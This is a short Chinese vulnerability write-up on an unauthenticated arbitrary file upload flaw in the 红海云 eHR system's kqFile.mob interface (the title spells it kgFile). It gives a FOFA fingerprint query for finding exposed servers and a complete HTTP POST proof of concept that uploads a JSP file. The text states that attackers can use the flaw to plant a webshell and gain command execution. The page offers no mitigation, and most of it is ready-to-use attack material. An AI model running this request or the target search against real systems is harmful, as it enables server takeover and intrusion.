# 红海云eHR系统kgFile.mob存在任意文件上传漏洞

红海云EHR系统kqFile.mob接口处存在未授权文件上传漏洞，攻击者可上传webshell来命令执行，获取服务器权限。

## fofa

```yaml
body="/RedseaPlatform/skins/images/favicon.ico"
```

## poc

```yaml
POST /RedseaPlatform/kqFile.mob?method=uploadFile&fileName=fbjgrohu.jsp HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeaaGwoqCxccjHcca
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Length: 183

------WebKitFormBoundaryeaaGwoqCxccjHcca
Content-Disposition: form-data; name="fj_file"; filename="fbjgrohu.jpg"

<% out.println(111*111); %>
------WebKitFormBoundaryeaaGwoqCxccjHcca--
```

